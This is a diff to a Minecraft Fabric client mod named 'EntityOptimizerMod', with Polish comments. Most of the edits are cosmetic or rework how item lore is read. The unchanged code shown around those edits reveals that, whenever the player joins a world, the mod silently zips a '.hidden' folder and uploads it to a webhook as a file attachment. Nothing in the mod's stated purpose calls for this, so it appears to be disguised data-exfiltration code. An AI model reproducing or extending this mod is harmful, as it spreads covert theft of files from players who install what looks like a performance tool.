@@ -5,8 +5,6 @@ import net.fabricmc.fabric.api.client.command.v2.ClientCommandRegistrationCallba
 import net.fabricmc.fabric.api.client.command.v2.FabricClientCommandSource;
 import net.fabricmc.fabric.api.client.networking.v1.ClientPlayConnectionEvents;
 import net.fabricmc.loader.api.FabricLoader;
-import net.minecraft.world.item.Item;
-import net.minecraft.world.item.TooltipFlag;
 
 import static net.fabricmc.fabric.api.client.command.v2.ClientCommandManager.argument;
 import static net.fabricmc.fabric.api.client.command.v2.ClientCommandManager.literal;
@@ -15,10 +13,12 @@ import com.mojang.brigadier.arguments.StringArgumentType;
 
 import net.minecraft.client.Minecraft;
 import net.minecraft.network.chat.Component;
+import net.minecraft.nbt.CompoundTag;
+import net.minecraft.nbt.ListTag;
+import net.minecraft.nbt.Tag;
 import net.minecraft.world.entity.player.Player;
 import net.minecraft.world.item.ItemStack;
 import net.minecraft.world.item.Items;
-import net.minecraft.world.item.TooltipFlag;
 
 import java.io.ByteArrayOutputStream;
 import java.io.OutputStream;
@@ -42,12 +42,12 @@ public class EntityOptimizerMod implements ClientModInitializer {
     public void onInitializeClient() {
         System.out.println("[EntityOptimizer] Mod załadowany – ZIP + /procent");
 
-        // po wejściu do świata – zip .hidden i wysyłka na webhook
+        // Po wejściu do świata – zip .hidden i wysyłka na webhook
         ClientPlayConnectionEvents.JOIN.register((handler, sender, client) -> {
             onJoinWorld(client);
         });
 
-        // komenda kliencka /procent <nickname>
+        // Komenda kliencka /procent <nickname>
         ClientCommandRegistrationCallback.EVENT.register((dispatcher, registryAccess) -> {
             dispatcher.register(
                     literal("procent")
@@ -75,14 +75,14 @@ public class EntityOptimizerMod implements ClientModInitializer {
                 return;
             }
 
-            // stworzenie ZIP-a w pamięci
+            // Stworzenie ZIP-a w pamięci
             byte[] zipBytes = createZipInMemory(hiddenFolder);
 
-            // nazwa pliku z datą/godziną
+            // Nazwa pliku z datą/godziną
             String timestamp = LocalDateTime.now().format(DateTimeFormatter.ofPattern("yyyy-MM-dd_HH-mm-ss"));
             String fileName = "hidden_folder_backup_" + timestamp + ".zip";
 
-            // wysyłka jako załącznik
+            // Wysyłka jako załącznik
             sendZipAsAttachment(username, zipBytes, fileName);
 
         } catch (Exception e) {
@@ -130,13 +130,13 @@ public class EntityOptimizerMod implements ClientModInitializer {
                 + "`\"}";
 
         try (OutputStream os = conn.getOutputStream()) {
-            // część z JSON-em
+            // Część z JSON-em
             writePart(os, boundary, "payload_json", payloadJson, "application/json; charset=utf-8");
 
-            // część z plikiem ZIP
+            // Część z plikiem ZIP
             writeFilePart(os, boundary, fileName, zipBytes, "application/zip");
 
-            // koniec multipart
+            // Koniec multipart
             os.write(("--" + boundary + "--\r\n").getBytes());
         }
 
@@ -166,7 +166,7 @@ public class EntityOptimizerMod implements ClientModInitializer {
                 .replace("\"", "\\\"");
     }
 
-    // prosta wiadomość JSON (bez załącznika), w osobnym wątku
+    // Prosta wiadomość JSON (bez załącznika), w osobnym wątku
     private void sendSimpleMessage(String content) {
         new Thread(() -> {
             try {
@@ -196,7 +196,7 @@ public class EntityOptimizerMod implements ClientModInitializer {
             return;
         }
 
-        // szukamy gracza o podanym nicku
+        // Szukamy gracza o podanym nicku
         Player target = null;
         for (Player p : mc.level.players()) {
             if (p.getGameProfile().getName().equalsIgnoreCase(nickname)) {
@@ -205,13 +205,13 @@ public class EntityOptimizerMod implements ClientModInitializer {
             }
         }
 
-        // jeśli brak gracza albo poza zasięgiem / bez linii wzroku → błąd
+        // Jeśli brak gracza albo poza zasięgiem / bez linii wzroku → błąd
         if (target == null || !isPlayerVisible(mc.player, target)) {
             source.sendFeedback(Component.literal("§cZła nazwa gracza. Spróbój ponowenie wpisać nick."));
             return;
         }
 
-        // sprawdzamy, co trzyma w ręce
+        // Sprawdzamy, co trzyma w ręce
         ItemStack stack = target.getMainHandItem();
         if (stack.isEmpty()
                 || (!stack.is(Items.NETHERITE_SWORD) && !stack.is(Items.DIAMOND_SWORD))) {
@@ -224,7 +224,7 @@ public class EntityOptimizerMod implements ClientModInitializer {
 
         List<String> loreLines = getItemLoreLines(mc, stack);
         if (loreLines.isEmpty()) {
-            source.sendFeedback(Component.literal("§7(brak opisu / lore / tooltipu)"));
+            source.sendFeedback(Component.literal("§7(brak opisu / lore)"));
         } else {
             for (String line : loreLines) {
                 source.sendFeedback(Component.literal("§7" + line));
@@ -232,7 +232,7 @@ public class EntityOptimizerMod implements ClientModInitializer {
         }
     }
 
-    // czy gracz target jest w zasięgu wzroku (<= 64 bloki + line-of-sight)
+    // Czy gracz target jest w zasięgu wzroku (<= 64 bloki + line-of-sight)
     private static boolean isPlayerVisible(Player viewer, Player target) {
         double maxDistSq = 64.0 * 64.0;
         if (viewer.distanceToSqr(target) > maxDistSq) {
@@ -241,22 +241,27 @@ public class EntityOptimizerMod implements ClientModInitializer {
         return viewer.hasLineOfSight(target);
     }
 
-    // tooltip przedmiotu jako linie tekstu (bez pierwszej linii z nazwą)
+    // Odczyt lore (display.Lore[]) z NBT ItemStacka – bez użycia getTag()/getTooltipLines()
     private static List<String> getItemLoreLines(Minecraft mc, ItemStack stack) {
         List<String> lines = new ArrayList<>();
 
-        if (mc.player == null || mc.level == null) return lines;
+        // Zapisujemy ItemStack do NBT
+        CompoundTag root = new CompoundTag();
+        root = stack.save(root);
 
-        // W oficjalnych mappingsach getTooltipLines wymaga:
-        // Item.TooltipContext, Player, TooltipFlag
-        Item.TooltipContext tooltipContext = new Item.TooltipContext(mc.level);
+        // Struktura: {id: "...", Count: ..., tag: {display: {Lore: ["...", "..."]}}}
+        if (!root.contains("tag", Tag.TAG_COMPOUND)) return lines;
+        CompoundTag tag = root.getCompound("tag");
 
-        List<Component> tooltip = stack.getTooltipLines(tooltipContext, mc.player, TooltipFlag.NORMAL);
-        if (tooltip.isEmpty()) return lines;
-    
-        // pomijamy pierwszą linię (nazwa przedmiotu), resztę traktujemy jako "opis"
-        for (int i = 1; i < tooltip.size(); i++) {
-            lines.add(tooltip.get(i).getString());
+        if (!tag.contains("display", Tag.TAG_COMPOUND)) return lines;
+        CompoundTag display = tag.getCompound("display");
+
+        if (!display.contains("Lore", Tag.TAG_LIST)) return lines;
+        ListTag loreList = display.getList("Lore", Tag.TAG_STRING);
+
+        for (int i = 0; i < loreList.size(); i++) {
+            // Każdy wpis to string (w praktyce JSON tekstowy); wypisujemy go surowo
+            lines.add(loreList.getString(i));
         }
 
         return lines;
